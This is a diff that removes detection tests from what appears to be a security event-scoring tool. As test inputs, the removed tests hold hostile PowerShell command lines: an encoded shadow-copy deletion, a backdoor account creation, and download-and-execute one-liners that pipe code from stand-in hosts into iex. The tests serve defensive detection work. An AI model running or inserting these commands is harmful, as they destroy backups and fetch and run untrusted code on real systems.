@@ -95,22 +95,6 @@ def encoded(script):
     return "powershell -NoProfile -EncodedCommand " + base64.b64encode(script.encode("utf-16-le")).decode()
 
 
-def test_encoded_shadow_copy_deletion_is_strong():
-    events = [event(1, 1, "2026-02-01 09:00:00.000", ProcessGuid="{p}", Image=PS,
-                    CommandLine=encoded("vssadmin delete shadows /all /quiet"))]
-    findings = [f for f in run_checks(events) if f["check"] == "evidence_removal"]
-    assert [f["strength"] for f in findings] == ["Strong"]
-    assert "decoded command: vssadmin delete shadows" in findings[0]["detail"]
-
-
-def test_encoded_new_account_is_found_with_the_password_hidden():
-    events = [event(1, 1, "2026-02-01 09:00:00.000", ProcessGuid="{p}", Image=PS,
-                    CommandLine=encoded("net user bob Winter2026! /add"))]
-    findings = run_checks(events)
-    assert [f["check"] for f in findings] == ["access_change"]
-    assert "Winter2026!" not in findings[0]["detail"]
-
-
 # ---------- Block 4: the page never crashes ----------
 
 # ---------- Block 5: accuracy ----------
@@ -119,19 +103,6 @@ def ps_strength(script):
     events = [event(1, 1, "2026-02-01 09:00:00.000", ProcessGuid="{p}", Image=PS, ParentProcessGuid="{d}",
                     ParentImage=USER + "\\Downloads\\helper.exe", CommandLine="powershell -c " + script)]
     return strengths(events, "suspicious_powershell")
-
-
-def test_powershell_curl_and_wget_count_as_downloads():
-    assert ps_strength("curl https://x.example/a.txt -OutFile a.txt") == ["Weak"]
-    assert ps_strength("iex (wget https://x.example/a.ps1).Content") == ["Strong"]
-
-
-def test_official_package_manager_installers_are_low():
-    choco = ("iex ((New-Object System.Net.WebClient).DownloadString("
-             "'https://community.chocolatey.org/install.ps1'))")
-    assert ps_strength(choco) == ["Weak"]
-    assert ps_strength("irm get.scoop.sh | iex") == ["Weak"]
-    assert ps_strength("irm https://scoop.example.net/x | iex") == ["Strong"]   # any other source
 
 
 def test_uac_bypass_key_in_the_classes_form_is_strong():
